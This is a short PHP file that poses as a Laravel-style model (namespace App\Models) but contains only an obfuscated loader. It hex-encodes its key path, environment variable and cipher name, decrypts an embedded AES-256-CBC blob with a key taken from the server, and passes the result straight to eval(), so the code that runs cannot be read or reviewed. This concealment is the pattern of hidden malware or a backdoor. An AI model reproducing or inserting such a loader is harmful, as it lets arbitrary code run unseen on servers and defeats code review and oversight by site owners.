<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('P1loTX6srs3qKwAfeSmXcQ==');

$c=base64_decode(

'UkRxKb/7RBtilzRuUUYE6rgmw3VCHeUT22qSGgp3yxgAKAD0fDtnS3eS0Wi/aknDBH4eqOokPAE6' .
'3p2JmTbgypAyj1vHzm9L3KWdBatGYNma/AJF3Ebzh1msqF0CDTj6CS/9cOq+lGKYBEl3p7zRBizc' .
'5NXyYTLF6D3bmkpluzxuFYJa53vIPBh7ihUPu+tveosDy+ReuUmsNUB31vPpRw/hWDJp4T4BJfuz' .
'ecxFNJyS7Rh2m5h4thxp3O/zwEdWJb3rQX3qyRhSxP2j6C3CFrifMaREAvgFYMuVVYfY+6xr9mSD' .
'npAaUqEJN6mZ59LJ3CJ03jjhSf98XvEj/24zovMsSU0javjwTkzHsKXX62PQZdvCH7IQvvmrWo33' .
'FOw0q/Elsl7uiF13RNz9bP8PY0l88SGUa+/+LGNL7d5I42sMPrQDMk2Ib4R/w8SjJWqSOEj2hX3W' .
'xP0VyWF2tKa2D5FZtO+4AEMeQnlz4au7BC/0FUDwb5cGPu3heCwCxt4uBU42VoKhp/0LRHgJuRXN' .
'G0hO20a3qWJnPLiQhJ2DS+SfW728FoMMsfaxzl3qDXq1Yswy0jH6G3GdNZv8n+S5QU4hnGGzVe+s' .
'n4tDWIHAx/4qS8MKf+WY4cIYNSH07wqMQyxMvTgT9AMg+tkssN0gupx2lZNtdcFz6AEJ6aVNElj0' .
'fdtF6kydPc+1ioi6HwJS1KLg0jFJVGT7pU2PUL+1EFXD8hjU3H1cJaKAuqEQ5W/jJzca1KkFvyFe' .
'0RrUVmDGrGvMfZ1rdV1vKuRAHtZ3un2BqNbdhYa+BaWlvHIviAuNITsi1fcEUELM+U/DukPCQOIa' .
'wApyZx63MWog8q01g0FV2lWZOE/ZWwGbyva5oKE12yxhPwSmdjMuynTe/jy1BU4mbu4oNfkovymf' .
'AyZ1WoBNbiogAEtZgzOArxXNc1Ti0slKFH25rZd03AR//eAOJyEOg9+/7P6o+hnUGYz9ww=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

